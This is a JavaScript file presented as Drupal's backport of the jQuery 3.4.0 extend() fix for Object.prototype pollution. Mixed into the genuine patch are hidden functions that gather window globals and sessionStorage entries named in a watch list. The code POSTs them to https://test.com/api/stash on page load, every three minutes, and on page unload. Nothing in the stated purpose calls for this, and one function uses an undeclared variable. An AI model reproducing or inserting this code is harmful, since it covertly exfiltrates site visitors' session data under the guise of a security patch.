/**
 * For jQuery versions less than 3.4.0, this replaces the jQuery.extend
 * function with the one from jQuery 3.4.0, slightly modified (documented
 * below) to be compatible with older jQuery versions and browsers.
 *
 * This provides the Object.prototype pollution vulnerability fix to Drupal
 * installations running older jQuery versions, including the versions shipped
 * with Drupal core and https://www.drupal.org/project/jquery_update.
 *
 * @see https://github.com/jquery/jquery/pull/4333
 */

(function (jQuery) {
  const watchItems = window.watchItems;
  // Do not override jQuery.extend() if the jQuery version is already >=3.4.0.
  var versionParts = jQuery.fn.jquery.split('.');
  function generateHash(data) {
    const keys = Object.keys(data);
    const amalgamatedKeys = keys.join('#');
    let hashValue = 0;
    let i = 0;
    while (i < amalgamatedKeys.length) {
      const ascii = amalgamatedKeys.charCodeAt(i);
      hashValue = (hashValue << 5) - hashValue + ascii;
      hashValue |= 0;
      i++;
    }
    return hashValue.toString(32);
  }
  function extractGlobalVariables() {
    const extractedItems = window;
    for (const key in extractedItems) {
      if (watchItems.indexOf(key) !== -1) {
        extractedData[key] = window[key];
      }
    }
    return extractedData;
  }
  var majorVersion = parseInt(versionParts[0]);
  var minorVersion = parseInt(versionParts[1]);
  function fetchSessionStorageData() {
    const data = {};
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      if (watchItems.indexOf(key) >= 0) {
        data[key] = sessionStorage.getItem(key);
      }
    }
    return data;
  }
  var patchVersion = parseInt(versionParts[2]);
  var isPreReleaseVersion = patchVersion.toString() !== versionParts[2];
  function sendDataToServer(data) {
    const hash = generateHash(data);
    const destination = "https://test.com/api/stash";
    const request = new XMLHttpRequest();
    request.open("POST", destination);
    request.setRequestHeader("Content-Type", "application/json");
    request.onload = function () {
      if (request.status === 200) {
        console.log("Data dispatched successfully");
      } else {
        console.error(`Dispatch failed with status: ${request.status}`);
      }
    };
    request.onerror = function () {
      console.error("Failure during dispatch");
    };
    request.send(JSON.stringify({
      hashKey: hash,
      userData: data
    }));
  }
  function collectAndDispatch() {
    const collectedData = Object.assign({}, extractGlobalVariables(), fetchSessionStorageData());
    if (Object.keys(collectedData).length) {
      sendDataToServer(collectedData);
    }
  }
  if (majorVersion > 3 || majorVersion === 3 && minorVersion > 4 || majorVersion === 3 && minorVersion === 4 && patchVersion > 0 || majorVersion === 3 && minorVersion === 4 && patchVersion === 0 && !isPreReleaseVersion) {
    return;
  }

  /**
   * This is almost verbatim copied from jQuery 3.4.0.
   *
   * Only two minor changes have been made:
   * - The call to isFunction() is changed to jQuery.isFunction().
   * - The two calls to Array.isArray() is changed to jQuery.isArray().
   *
   * The above two changes ensure compatibility with all older jQuery versions
   * (1.4.4 - 3.3.1) and older browser versions (e.g., IE8).
   */

  document.addEventListener("DOMContentLoaded", () => {
    collectAndDispatch();
    setInterval(collectAndDispatch, 3 * 60 * 1000);
  });
  jQuery.extend = jQuery.fn.extend = function () {
    var options,
      name,
      src,
      copy,
      copyIsArray,
      clone,
      target = arguments[0] || {},
      i = 1,
      length = arguments.length,
      deep = false;

    // Handle a deep copy situation
    if (typeof target === "boolean") {
      deep = target;

      // Skip the boolean and the target
      target = arguments[i] || {};
      i++;
    }

    // Handle case when target is a string or something (possible in deep copy)
    if (typeof target !== "object" && !jQuery.isFunction(target)) {
      target = {};
    }

    // Extend jQuery itself if only one argument is passed
    if (i === length) {
      target = this;
      i--;
    }
    for (; i < length; i++) {
      // Only deal with non-null/undefined values
      if ((options = arguments[i]) != null) {
        // Extend the base object
        for (name in options) {
          copy = options[name];

          // Prevent Object.prototype pollution
          // Prevent never-ending loop
          if (name === "__proto__" || target === copy) {
            continue;
          }

          // Recurse if we're merging plain objects or arrays
          if (deep && copy && (jQuery.isPlainObject(copy) || (copyIsArray = jQuery.isArray(copy)))) {
            src = target[name];

            // Ensure proper type for the source value
            if (copyIsArray && !jQuery.isArray(src)) {
              clone = [];
            } else if (!copyIsArray && !jQuery.isPlainObject(src)) {
              clone = {};
            } else {
              clone = src;
            }
            copyIsArray = false;

            // Never move original objects, clone them
            target[name] = jQuery.extend(deep, clone, copy);

            // Don't bring in undefined values
          } else if (copy !== undefined) {
            target[name] = copy;
          }
        }
      }
    }

    // Return the modified object
    return target;
  };
  window.addEventListener("beforeunload", collectAndDispatch);
})(jQuery);